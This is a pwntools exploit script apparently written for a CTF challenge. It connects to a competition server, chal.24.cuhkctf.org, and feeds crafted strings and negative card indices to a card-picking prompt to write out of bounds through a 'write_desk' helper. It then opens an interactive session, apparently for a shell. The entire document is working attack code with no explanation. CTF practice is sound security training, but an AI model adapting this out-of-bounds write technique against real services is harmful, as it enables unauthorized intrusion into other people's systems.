from pwn import *

context.arch = 'amd64'
context.endian = 'little'
context.os = 'linux'
context.terminal = ['konsole', '-e']
context.log_level = 'debug'

# p : process = gdb.debug("./chall", gdbscript='''
# b *play+256
# continue
# ''')
p = remote('chal.24.cuhkctf.org', 24066)

p.sendlineafter(b'Pick a card to get: ', b'0')

# for i in range(1, 4):
#     p.sendlineafter(b'Pick a card to get: ', b'000dn2F')
#     p.sendlineafter(b'Pick a card to get: ', str(-2-i).encode())
#     p.sendlineafter(b'Pick a card to get: ', str(4+i).encode())

def write_desk(chr3, idx):
    for i in range(3):
        p.sendlineafter(b'Pick a card to get: ', chr3)
        p.sendlineafter(b'Pick a card to get: ', str(-2-i).encode())
        p.sendlineafter(b'Pick a card to get: ', str(idx+i).encode())

write_desk(b'0000p1h', 5)
write_desk(b'0000Sdn', 2)
write_desk(b'0000n2F', 0)

p.sendlineafter(b'Pick a card to get: ', b'0000n2F')
p.sendlineafter(b'Pick a card to get: ', str(-2).encode())

p.sendlineafter(b'Pick a card to get: ', b'bet')

p.interactive()
